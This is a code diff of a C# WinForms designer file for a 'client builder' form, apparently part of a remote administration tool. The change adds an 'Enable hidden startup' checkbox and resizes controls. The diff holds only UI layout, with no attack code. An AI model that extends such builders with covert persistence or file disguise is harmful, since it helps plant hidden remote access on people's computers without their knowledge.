@@ -32,6 +32,7 @@
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmBuilder));
             this.btnBuild = new System.Windows.Forms.Button();
             this.tooltip = new System.Windows.Forms.ToolTip(this.components);
+            this.chkHiddenStartup = new System.Windows.Forms.CheckBox();
             this.picUAC2 = new System.Windows.Forms.PictureBox();
             this.picUAC1 = new System.Windows.Forms.PictureBox();
             this.rbSystem = new System.Windows.Forms.RadioButton();
@@ -132,13 +133,26 @@
             // 
             // btnBuild
             // 
-            this.btnBuild.Location = new System.Drawing.Point(402, 384);
+            this.btnBuild.Location = new System.Drawing.Point(402, 394);
             this.btnBuild.Name = "btnBuild";
             this.btnBuild.Size = new System.Drawing.Size(121, 23);
             this.btnBuild.TabIndex = 1;
             this.btnBuild.Text = "Build Client";
             this.btnBuild.UseVisualStyleBackColor = true;
             this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
+            // 
+            // chkHiddenStartup
+            // 
+            this.chkHiddenStartup.AutoSize = true;
+            this.chkHiddenStartup.Location = new System.Drawing.Point(20, 352);
+            this.chkHiddenStartup.Name = "chkHiddenStartup";
+            this.chkHiddenStartup.Size = new System.Drawing.Size(141, 17);
+            this.chkHiddenStartup.TabIndex = 39;
+            this.chkHiddenStartup.Text = "Enable hidden startup";
+            this.tooltip.SetToolTip(this.chkHiddenStartup, "This will invalidate all other installation settings and use hardcoded ones\r\ninst" +
+        "ead");
+            this.chkHiddenStartup.UseVisualStyleBackColor = true;
+            this.chkHiddenStartup.CheckedChanged += new System.EventHandler(this.chkHiddenStartup_CheckedChanged);
             // 
             // picUAC2
             // 
@@ -238,7 +252,7 @@
             this.builderTabs.Multiline = true;
             this.builderTabs.Name = "builderTabs";
             this.builderTabs.SelectedIndex = 0;
-            this.builderTabs.Size = new System.Drawing.Size(535, 378);
+            this.builderTabs.Size = new System.Drawing.Size(535, 388);
             this.builderTabs.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
             this.builderTabs.TabIndex = 0;
             // 
@@ -259,7 +273,7 @@
             this.generalPage.Location = new System.Drawing.Point(140, 4);
             this.generalPage.Name = "generalPage";
             this.generalPage.Padding = new System.Windows.Forms.Padding(3);
-            this.generalPage.Size = new System.Drawing.Size(391, 370);
+            this.generalPage.Size = new System.Drawing.Size(391, 380);
             this.generalPage.TabIndex = 4;
             this.generalPage.Text = "General Settings";
             // 
@@ -305,7 +319,7 @@
             this.label7.AutoSize = true;
             this.label7.Location = new System.Drawing.Point(17, 20);
             this.label7.Name = "label7";
-            this.label7.Size = new System.Drawing.Size(324, 13);
+            this.label7.Size = new System.Drawing.Size(323, 13);
             this.label7.TabIndex = 1;
             this.label7.Text = "You can choose a tag which helps you to identify your clients.";
             // 
@@ -314,7 +328,7 @@
             this.lblTag.AutoSize = true;
             this.lblTag.Location = new System.Drawing.Point(17, 43);
             this.lblTag.Name = "lblTag";
-            this.lblTag.Size = new System.Drawing.Size(61, 13);
+            this.lblTag.Size = new System.Drawing.Size(60, 13);
             this.lblTag.TabIndex = 2;
             this.lblTag.Text = "Client Tag:";
             // 
@@ -390,7 +404,7 @@
             this.connectionPage.Location = new System.Drawing.Point(140, 4);
             this.connectionPage.Name = "connectionPage";
             this.connectionPage.Padding = new System.Windows.Forms.Padding(3);
-            this.connectionPage.Size = new System.Drawing.Size(391, 370);
+            this.connectionPage.Size = new System.Drawing.Size(391, 380);
             this.connectionPage.TabIndex = 0;
             this.connectionPage.Text = "Connection";
             // 
@@ -574,6 +588,7 @@
             // installationPage
             // 
             this.installationPage.BackColor = System.Drawing.SystemColors.Control;
+            this.installationPage.Controls.Add(this.chkHiddenStartup);
             this.installationPage.Controls.Add(this.line7);
             this.installationPage.Controls.Add(this.label10);
             this.installationPage.Controls.Add(this.line4);
@@ -599,7 +614,7 @@
             this.installationPage.Location = new System.Drawing.Point(140, 4);
             this.installationPage.Name = "installationPage";
             this.installationPage.Padding = new System.Windows.Forms.Padding(3);
-            this.installationPage.Size = new System.Drawing.Size(391, 370);
+            this.installationPage.Size = new System.Drawing.Size(391, 380);
             this.installationPage.TabIndex = 1;
             this.installationPage.Text = "Installation";
             // 
@@ -798,7 +813,7 @@
             this.assemblyPage.Controls.Add(this.txtCopyright);
             this.assemblyPage.Location = new System.Drawing.Point(140, 4);
             this.assemblyPage.Name = "assemblyPage";
-            this.assemblyPage.Size = new System.Drawing.Size(391, 370);
+            this.assemblyPage.Size = new System.Drawing.Size(391, 380);
             this.assemblyPage.TabIndex = 2;
             this.assemblyPage.Text = "Assembly Information";
             // 
@@ -853,7 +868,7 @@
             this.lblFileVersion.AutoSize = true;
             this.lblFileVersion.Location = new System.Drawing.Point(17, 243);
             this.lblFileVersion.Name = "lblFileVersion";
-            this.lblFileVersion.Size = new System.Drawing.Size(70, 13);
+            this.lblFileVersion.Size = new System.Drawing.Size(69, 13);
             this.lblFileVersion.TabIndex = 15;
             this.lblFileVersion.Text = "File Version:";
             // 
@@ -887,7 +902,7 @@
             this.lblProductVersion.AutoSize = true;
             this.lblProductVersion.Location = new System.Drawing.Point(17, 215);
             this.lblProductVersion.Name = "lblProductVersion";
-            this.lblProductVersion.Size = new System.Drawing.Size(92, 13);
+            this.lblProductVersion.Size = new System.Drawing.Size(91, 13);
             this.lblProductVersion.TabIndex = 13;
             this.lblProductVersion.Text = "Product Version:";
             // 
@@ -955,7 +970,7 @@
             this.lblTrademarks.AutoSize = true;
             this.lblTrademarks.Location = new System.Drawing.Point(17, 159);
             this.lblTrademarks.Name = "lblTrademarks";
-            this.lblTrademarks.Size = new System.Drawing.Size(68, 13);
+            this.lblTrademarks.Size = new System.Drawing.Size(67, 13);
             this.lblTrademarks.TabIndex = 9;
             this.lblTrademarks.Text = "Trademarks:";
             // 
@@ -979,7 +994,7 @@
             this.additionalTab.Controls.Add(this.chkIconChange);
             this.additionalTab.Location = new System.Drawing.Point(140, 4);
             this.additionalTab.Name = "additionalTab";
-            this.additionalTab.Size = new System.Drawing.Size(391, 370);
+            this.additionalTab.Size = new System.Drawing.Size(391, 380);
             this.additionalTab.TabIndex = 3;
             this.additionalTab.Text = "Additional Settings";
             // 
@@ -1006,7 +1021,7 @@
             this.label13.AutoSize = true;
             this.label13.Location = new System.Drawing.Point(20, 21);
             this.label13.Name = "label13";
-            this.label13.Size = new System.Drawing.Size(317, 13);
+            this.label13.Size = new System.Drawing.Size(316, 13);
             this.label13.TabIndex = 1;
             this.label13.Text = "You will be asked to choose the icon when building a client.";
             // 
@@ -1044,7 +1059,7 @@
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.SystemColors.Control;
-            this.ClientSize = new System.Drawing.Size(535, 419);
+            this.ClientSize = new System.Drawing.Size(535, 426);
             this.Controls.Add(this.builderTabs);
             this.Controls.Add(this.btnBuild);
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
@@ -1166,5 +1181,6 @@
         private Controls.Line line10;
         private System.Windows.Forms.Label label14;
         private System.Windows.Forms.ToolStripMenuItem ctxtClear;
+        private System.Windows.Forms.CheckBox chkHiddenStartup;
     }
 }
